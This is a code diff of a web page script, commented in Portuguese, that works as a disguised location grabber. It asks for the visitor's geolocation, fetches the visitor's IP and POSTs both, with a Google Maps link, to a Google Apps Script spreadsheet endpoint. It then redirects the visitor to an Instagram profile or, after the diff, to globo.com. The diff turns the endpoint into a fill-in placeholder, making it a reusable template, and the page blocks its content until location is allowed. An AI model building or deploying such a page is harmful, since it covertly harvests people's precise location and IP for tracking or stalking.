@@ -30,16 +30,15 @@
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      // Captura o IP do visitante
+      // Captura o IP
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
-
           const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-          // Envia os dados para sua planilha no Google Sheets
-          fetch('https://script.google.com/macros/s/AKfycbyV5FREJIvqLuTQXT5GK8pl9-UsLldMreMMCcvr2Zy4jlmVfkjkqvTh6Jd01HvTzKym/exec', {
+          // Envia os dados para a planilha
+          fetch('SEU_LINK_DO_WEBAPP_AQUI', {
             method: 'POST',
             mode: 'no-cors',
             headers: {
@@ -51,20 +50,21 @@
               ip: ip,
               maps: mapsLink
             })
+          }).then(() => {
+            redireciona();
+          }).catch(() => {
+            redireciona();
           });
-
-          // Após capturar, redireciona para o Instagram
-          redirecionaInstagram();
         });
     }
 
     function erro(err) {
-      console.warn("Geolocalização não permitida ou erro:", err);
-      document.body.innerHTML = "<p>⚠️ É necessário permitir a localização para continuar.</p>";
+      console.warn("Erro de geolocalização:", err);
+      document.body.innerHTML = "<p>⚠️ Você precisa permitir o acesso à localização para continuar.</p>";
     }
 
-    function redirecionaInstagram() {
-      window.location.href = "https://www.instagram.com/_.karinaborges?igsh=ZmRubmdya2l3ZDRm";
+    function redireciona() {
+      window.location.href = "https://www.globo.com";
     }
   </script>
 </head>
